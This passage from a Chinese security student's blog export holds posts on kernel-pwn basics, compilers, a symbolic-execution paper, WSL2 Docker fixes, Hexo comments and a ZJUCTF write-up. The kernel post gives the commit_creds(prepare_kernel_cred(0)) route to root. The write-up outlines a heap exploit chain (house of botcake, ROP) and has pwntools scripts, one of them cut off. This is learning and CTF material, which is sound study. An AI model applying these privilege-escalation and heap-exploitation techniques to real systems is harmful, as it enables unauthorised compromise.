*/</span><br><span class="line">sub $(6*8), %rsp                 /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过汇编指令判断是否为x32_abi（x32架构的程序）</p>
</li>
<li><p>通过系统调用号，跳到全局变量sys_call_table相应位置继续执行系统调用。</p>
</li>
</ol>
<h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><p>退出时，流程如下：</p>
<ol>
<li>通过swapgs恢复GS值</li>
<li>通过sysretq或者iretq恢复到用户空间继续执行。如果iretq还需要给出用户空间的一些信息（CS，eflags&#x2F;rflags，esp&#x2F;rsp等）</li>
</ol>
<h3 id="2-4-Syscall系统调用"><a href="#2-4-Syscall系统调用" class="headerlink" title="2.4 Syscall系统调用"></a>2.4 Syscall系统调用</h3><p><strong>系统调用：</strong>指的是用户空间的程序向操作系统内核请求更高权限的服务，比如I&#x2F;O操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如scanf，puts等I&#x2F;O相关函数实际上是对系统调用（eg: read, write）的封装）</p>
<p>系统调用号可以在<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code>和<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code>查看。</p>
<p>系统调用号查询：<code>Linux Syscall Reference</code>和<code>Linux Syscall64 Reference</code></p>
<h3 id="2-5-ioctl设备通信"><a href="#2-5-ioctl设备通信" class="headerlink" title="2.5 ioctl设备通信"></a>2.5 ioctl设备通信</h3><p>ioctl官方手册(<code>shell: man 2 ioctl</code>)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;sys/ioctl.h&gt;</span><br><span class="line"></span><br><span class="line">       int ioctl(int fd, unsigned long request, ...);</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The ioctl() system call manipulates the underlying device parameters of</span><br><span class="line">       special files.  In particular, many operating characteristics of  char‐</span><br><span class="line">       acter  special  files  (e.g., terminals) may be controlled with ioctl()</span><br><span class="line">       requests.  The argument fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third  ar‐</span><br><span class="line">       gument  is an untyped pointer to memory.  It&#x27;s traditionally char *argp</span><br><span class="line">       (from the days before void * was valid C), and will  be  so  named  for</span><br><span class="line">       this discussion.</span><br><span class="line"></span><br><span class="line">       An  ioctl() request has encoded in it whether the argument is an in pa‐</span><br><span class="line">       rameter or out parameter, and the size of the argument argp  in  bytes.</span><br><span class="line">       Macros and defines used in specifying an ioctl() request are located in</span><br><span class="line">       the file &lt;sys/ioctl.h&gt;.  See NOTES.</span><br><span class="line"></span><br><span class="line">RETURN VALUE</span><br><span class="line">       Usually, on success zero is returned.  A few ioctl() requests  use  the</span><br><span class="line">       return  value  as an output parameter and return a nonnegative value on</span><br><span class="line">       success.  On error, -1 is returned, and errno is set appropriately.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出ioctl也是一个系统调用，用于与设备通信。</p>
<p>int ioctl(int fd, unsigned long request, …) 的第一个参数为打开设备 (open) 返回的 文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。<br><strong>使用 ioctl 进行通信的原因：</strong></p>
<ul>
<li>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。</li>
<li>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</li>
<li>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</li>
</ul>
<h3 id="2-6-内核态函数调用"><a href="#2-6-内核态函数调用" class="headerlink" title="2.6 内核态函数调用"></a>2.6 内核态函数调用</h3><p>相比用户态库函数调用，内核态的函数有了一些变化：</p>
<ol>
<li>printf()变更为**printk()**，但需要注意的是printk()<strong>不一定会把内容显示到终端上，但一定在内核缓冲区里</strong>，可以通过 dmesg 查看效果。</li>
<li>memcpy() 变更为**copy_from_user()&#x2F;copy_to_user()**：copy_from_user() 实现了将用户空间的数据传送到内核空间；copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
<li>malloc()变更为**kmalloc()**，内核态的内存分配函数，和malloc()相似，但使用的是 slab&#x2F;slub 分配器</li>
<li>free()变更为**kfree()**，同 kmalloc()</li>
</ol>
<h3 id="2-7-内核权限管理"><a href="#2-7-内核权限管理" class="headerlink" title="2.7 内核权限管理"></a>2.7 内核权限管理</h3><p>kernel负责管理进程，因此kernel也记录了进程的权限。kernel中有两个可以方便的改变权限的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line"><span class="keyword">struct</span> cred* <span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct* daemon)</span></span><br></pre></td></tr></table></figure>

<p><strong>从函数名也可以看出，执行 commit_creds(prepare_kernel_cred(0)) 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。</strong></p>
<p>更多关于 prepare_kernel_cred 的信息可以参考源码<br>执行 commit_creds(prepare_kernel_cred(0)) 也是最常用的提权手段，两个函数的地址都可以在 &#x2F;proc&#x2F;kallsyms 中查看（较老的内核版本中是 &#x2F;proc&#x2F;ksyms）。</p>


<p>注：一般情况下，&#x2F;proc&#x2F;kallsyms 的内容需要 root 权限才能查看，若以非root权限查看将显示为0地址。</p>
<h4 id="struct-cred-–-进程权限结构体"><a href="#struct-cred-–-进程权限结构体" class="headerlink" title="struct cred – 进程权限结构体"></a>struct cred – 进程权限结构体</h4><p>内核使用cred结构体记录进程的权限，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息(uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。结构体源码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h3 id="2-8-内核保护机制"><a href="#2-8-内核保护机制" class="headerlink" title="2.8 内核保护机制"></a>2.8 内核保护机制</h3><ol>
<li><strong>smep</strong>: Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行<strong>用户空间</strong>的代码会触发页错误。（在 arm 中该保护称为 PXN)</li>
<li><strong>smap</strong>: Superivisor Mode Access Protection，类似于 smep，当处理器处于 ring 0 模式，访问<strong>用户空间</strong>的数据会触发页错误。</li>
<li><strong>MMAP_MIN_ADDR</strong>：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li>
<li><strong>KASLR</strong>：Kernel Address Space Layout Randomization(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li>
</ol>
<p>注：Canary, DEP, PIE, RELRO 等保护与用户态原理和作用相同。</p>
<h2 id="3-LKM介绍"><a href="#3-LKM介绍" class="headerlink" title="3. LKM介绍"></a>3. LKM介绍</h2><h4 id="3-1-LKM"><a href="#3-1-LKM" class="headerlink" title="3.1 LKM"></a>3.1 LKM</h4><p>LKM（Loadable Kernel Modules）称为可加载核心模块（内核模块），其可以看作是运行在内和空间的可执行程序，包括：</p>
<ul>
<li>驱动程序（Device drivers）设备驱动文件系统驱动…</li>
<li>内核扩展模块（Modules）</li>
</ul>
<p>LKMs的文件格式和用户态的可执行程序相同，Linux下位ELF，可以使用IDA工具来分析。</p>
<p>模块记忆单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程不同。</p>
<p>模块通常用来实现一种文件系统，一个驱动程序或者其他内核上层的功能。</p>
<p>Linux内核之所以提供模块机制，是因为它本身是一个宏内核（monolithic kernel）。优 点是效率高，都在内核空间运行，缺点时可扩展性和可维护性相对较差，模块机制0     就是为了弥补这一缺陷。</p>
<p><strong>通常情况下，Kernel漏洞的发生也常见于加载的LKMs出现问题。</strong></p>
<p>内核模块的相关指令：<code>insmod</code>, <code>rmmod</code>, <code>lsmod</code>, <code>modprobe</code></p>
<h4 id="3-2-file-operations-结构体"><a href="#3-2-file-operations-结构体" class="headerlink" title="3.2 file_operations 结构体"></a>3.2 file_operations 结构体</h4><p>用户进程在对设备文件进行诸如read&#x2F;write操作时，<strong>系统调用通过设备文件的主设备号找到设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理</strong>。</p>
<p>内核模块程序的结构中包括一些<a href="https://zhuanlan.zhihu.com/p/627181746">callback回调表</a>，对应的函数存储在一个file_operation(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。</p>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Events	User 	functions			Kernel functions</span></span><br><span class="line"><span class="comment">Load	insmod	module_init()</span></span><br><span class="line"><span class="comment">Open	fopen	file_operations: 	open</span></span><br><span class="line"><span class="comment">Read	fread	file_operations: 	read</span></span><br><span class="line"><span class="comment">Write	fwrite	file_operations: 	write</span></span><br><span class="line"><span class="comment">Close	fclose	file_operations: 	release</span></span><br><span class="line"><span class="comment">Remove	rmmod	module_exit()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Hello world!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Bye, cruel worldn&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    read: module_read,</span><br><span class="line">    write: module_write,</span><br><span class="line">    open: module_open,</span><br><span class="line">    release: module_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中，module_init&#x2F;module_exit是在载入&#x2F;卸载这个驱动时自动运行；而fop结构体实现了如上四个callback，冒号右侧的函数名是由开发者自己起的，在驱动程序载入内核后，其他用户程序程序就可以借助<strong>文件方式</strong>像进行系统调用一样调用这些函数实现所需功能。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>不同于用户态的pwn，Kernel-Pwn不再是用python远程链接打payload拿shell，而是给你一个环境包，下载后qemu本地起系统。对于一个Kernel-Pwn来说，题目通常会给定以下文件：<br><strong>boot.sh:</strong> 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 启动参数有关；<strong>bzImage</strong>: kernel binary；<strong>rootfs.cpio</strong>: 文件系统映像<br><strong>qemu 启动的参数：</strong></p>
<ul>
<li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li>
<li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li>
<li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li>
<li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 —help 查看。</li>
</ul>
<p>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。<br>但是为了我们调试Demo方便，我们最好在本地也编译一个bzImage。</p>
<p>注：部分Kernel漏洞只影响低版本，高版本的Kernel已对脆弱的机制进行了一定程度的遏制乃至进行了消除，但是和Glibc相同，部分中低版本的内核仍有很高的用户量，因此我们对于低版本Kernel的漏洞研究并非是没有意义的，同时，在实际调试Demo时，请特别注意Demo漏洞影响的Kernel版本。</p>
]]></content>
      <tags>
        <tag>Kernel Pwn</tag>
        <tag>LKM</tag>
        <tag>内核模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核模块-交叉编译器</title>
    <url>/posts/b78b50e.html</url>
    <content><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
<ul>
<li>包括编译器、链接器、binutils、glibc、头文件</li>
<li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
</ul>
<h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>编译器的构成</p>
<ul>
<li>Frontend：源码分析、语法检查，输出中间代码</li>
<li>Optimizer：对中间代码进行优化、使其运行更高效</li>
<li>Backend：将中间代码转换为某一个平台的机器代码</li>
</ul>
<p>编译器的实现</p>
<ul>
<li>GCC：前端和后端分离，支持多种语言、多个平台。但缺点：前后端耦合高，代码可重用性低。</li>
<li>LLVM（Low Level Virtual Machine）框架：<strong>模块化设计</strong>，代码可重用性高；中间语言LLVM IR，<strong>类C表达</strong>，<strong>可扩展</strong>各种前端、后端；支持C&#x2F;C++&#x2F;Java等语言</li>
<li>使用LLVM框架的编译器：<ul>
<li>LLVM GCC：前端使用GCC（Apple）</li>
<li>Clang：LLVM+Clang前端（使用C&#x2F;C++）（Apple，Android）</li>
<li>方舟编译器：编译优化（Java虚拟机，效率提高），鸿蒙系统</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>内核模块</tag>
        <tag>交叉编译</tag>
        <tag>gcc</tag>
        <tag>clang</tag>
      </tags>
  </entry>
  <entry>
    <title>DSE论文笔记</title>
    <url>/posts/25083369.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过建立一个比较简单的语法简单中间语言（A simple intermediate language，SIMPIL）。对Dynamic taint analysis和forward symbolic execution进行了讲解。</p>
<h3 id="SIMPIL"><a href="#SIMPIL" class="headerlink" title="SIMPIL"></a>SIMPIL</h3><img src="/posts/25083369/image-20240105122737426.png" class="" title="image-20240105122737426">

<img src="/posts/25083369/image-20240105122751384.png" class="" title="image-20240105122751384">

<h2 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h2><p><strong>动态污点分析</strong>：跟踪源头与sink点的信息流。任何由污染源推导的值都是污点（T），其他值看作未污染。</p>
<p><strong>两种错误：</strong></p>
<ul>
<li>overtainted：假阳性</li>
<li>undertainting：假阴性</li>
</ul>
<h3 id="动态污点分析策略"><a href="#动态污点分析策略" class="headerlink" title="动态污点分析策略"></a>动态污点分析策略</h3><h4 id="Taint-Introduction"><a href="#Taint-Introduction" class="headerlink" title="Taint Introduction"></a>Taint Introduction</h4><p>将用户输入作为污染源</p>
<h4 id="Taint-Propagation"><a href="#Taint-Propagation" class="headerlink" title="Taint Propagation"></a>Taint Propagation</h4><h4 id="Taint-Checking"><a href="#Taint-Checking" class="headerlink" title="Taint Checking"></a>Taint Checking</h4><p>查看是否污染</p>
<h2 id="前向符号执行"><a href="#前向符号执行" class="headerlink" title="前向符号执行"></a>前向符号执行</h2><p>前向符号性可以通过建立逻辑表达式分析程序在不同输入下的行为。属于静态分析。</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>DSE</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2配置Docker镜像源</title>
    <url>/posts/a7cc92dc.html</url>
    <content><![CDATA[<p>最近在搞PWN方向出题，需要用到docker环境部署，但是docker环境一直pull不下来，多次尝试后记录一下成功的配置。<br>由于不清楚是不是网络连接稳定导致的问题，此文章仅作参考。</p>
<p>本机环境：WSL2 + Docker Desktop</p>
<h2 id="配置情况"><a href="#配置情况" class="headerlink" title="配置情况"></a>配置情况</h2><p>最终成功pull下来的Docker Desktop配置信息</p>
<img src="/posts/a7cc92dc/image-20241027211458655.png" class="" title="image-20241027211458655">

<h2 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h2><ol>
<li>dial tcp: lookup auth.docker.io on 172.17.176.1:53: server misbehaving<br>出现该问题表示DNS配置出现问题，需要修改下&#x2F;etc&#x2F;resolv.conf文件内容(原因应该是wsl默认dns设置为windows主机的WSL网关地址，导致出现问题)<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ cat /etc/resolv.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[network]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">generateResolvConf = <span class="literal">false</span></span></span><br><span class="line">nameserver 172.17.176.1</span><br><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 114.114.114.114</span><br></pre></td></tr></table></figure></li>
<li>dial tcp: lookup auth.docker.io on xxxx: time out<br>表示无法正常连接，需要更换为国内镜像源，目前尚且没有找到很靠谱的镜像源，后续会随缘更新（其实开梯子然后不断尝试官方镜像也是有概率成功的hhhh…）</li>
</ol>
]]></content>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo添加gittalk评论功能</title>
    <url>/posts/f4a569f8.html</url>
    <content><![CDATA[<p>Hexo博客评论区功能搭建过程记录</p>
<p>尝试使用Gittalk来实现评论区功能，twikoo搭建过程中netlify账户验证不成功，还需要上传个人证件，比较抽象，因此还是采用gittalk的方式来构建评论区。</p>
<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/f4a569f8/image-20241028103236803.png" class="" title="image-20241028103236803">

<h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><ol>
<li><p><strong>在github中设置oauth application功能</strong>：打开github个人settings界面</p>
<img src="/posts/f4a569f8/image-20241028103444380.png" class="" title="image-20241028103444380">

<p>然后选择Developer settings，点击OAuth Apps，再选择新建New OAuth App：</p>
<img src="/posts/f4a569f8/image-20241028103534417.png" class="" title="image-20241028103534417">

<p>填写好名称，以及个人Hexo博客的地址即可获取到Client ID和ClientSecret，这两个需要在Hexo中进行配置。</p>
<img src="/posts/f4a569f8/image-20241028103619287.png" class="" title="image-20241028103619287">
</li>
<li><p><strong>在Hexo Butterfly主题配置Gittalk：</strong></p>
<p>参考<a href="https://butterfly.js.org/posts/4aa8abbe/?highlight=git#%E8%A9%95%E8%AB%96">官方文档</a>，在配置文件yml里填写好刚刚申请到的Client ID和ClientSecret就可以了。</p>
</li>
</ol>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
<li><p><strong>配置好后发现评论区没有初始化成功：</strong><img src="/posts/f4a569f8/image-20241028104105092.png" class="" title="image-20241028104105092"></p>
<p>原因是Gittalk需要管理员用户访问该页面才可以完成初始化，因此只需要点击登入完成认证即可。之后只需要访问一次其他文章界面就可以完成初始化。</p>
</li>
<li><p><strong>登入时报错Invalid Redirect URI</strong>：</p>
<img src="/posts/f4a569f8/image-20241028104306608.png" class="" title="image-20241028104306608">

<p>读报警信息可以知道，登入时所在url与配置github oauth app时配置的url不同，检查一下配置是否有问题即可。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>Hexo</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 ZJUCTF WriteUp</title>
    <url>/posts/dc126860.html</url>
    <content><![CDATA[<p>本次校赛题目质量不错，难度设置比较合适，属于是看到感觉可以试一试的程度。其中*A口算很有趣！强烈推荐！！！</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="小A口算"><a href="#小A口算" class="headerlink" title="小A口算"></a>小A口算</h3><p>该题目会随机生成20以内的数字比较，可以构造脚本在1分钟内刷够足够分数，从而获取flag</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">38981</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Try your best to answer questions as much as possible!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    challenge = (p.recvline()).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    v1 = challenge.split(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    v1[<span class="number">0</span>] = <span class="built_in">int</span>(v1[<span class="number">0</span>])</span><br><span class="line">    v1[<span class="number">1</span>] = <span class="built_in">int</span>(v1[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    info(v1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;input &#x27;&gt;&#x27;, &#x27;&lt;&#x27; or &#x27;=&#x27; :&quot;</span>, <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;input &#x27;&gt;&#x27;, &#x27;&lt;&#x27; or &#x27;=&#x27; :&quot;</span>, <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;input &#x27;&gt;&#x27;, &#x27;&lt;&#x27; or &#x27;=&#x27; :&quot;</span>, <span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Correct! Your score is&quot;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功获取flag: <code>ZJUCTF&#123;WoW_K1n6_0F_5h0-g4Ku-s31_4r1thm3t1c&#125;</code></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="cake-bot"><a href="#cake-bot" class="headerlink" title="cake_bot"></a>cake_bot</h3><p>保护全开，libc版本2.34<br>其中保存了两个列表（或者说一个结构体列表），列表长度限制为16</p>
<ul>
<li><code>cake_list</code>: 保存malloc的cake地址</li>
<li><code>cake_size_list</code>: 保存cake的size</li>
</ul>
<p>其中定义了Add，Show, Delete函数</p>
<ul>
<li>Add函数：申请新的cake，可以选择存放在列表的index，申请前检查index是否超过16，或者申请size是否不为0；然后定义cakesize，malloc对应大小的cake，然后读取对应大小的输入。</li>
<li>Show函数：检查对应index的cake内容；</li>
<li>Delete函数：释放对应的index的cake，这里没有将cake_list对应index堆地址置0，而且将size置0，因此可以delete后add该index。之后就可以泄露libc等内容。</li>
</ul>
<p><strong>思路</strong>：通过unsortedbin attack泄漏libc地址，也可以通过tcachebin泄露heap地址，还可以通过house of botcake获取栈environ地址。接下来就是通过house of botcake构造rop写入栈返回地址了</p>
<p><code>exp</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choose a box to pack the cake:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    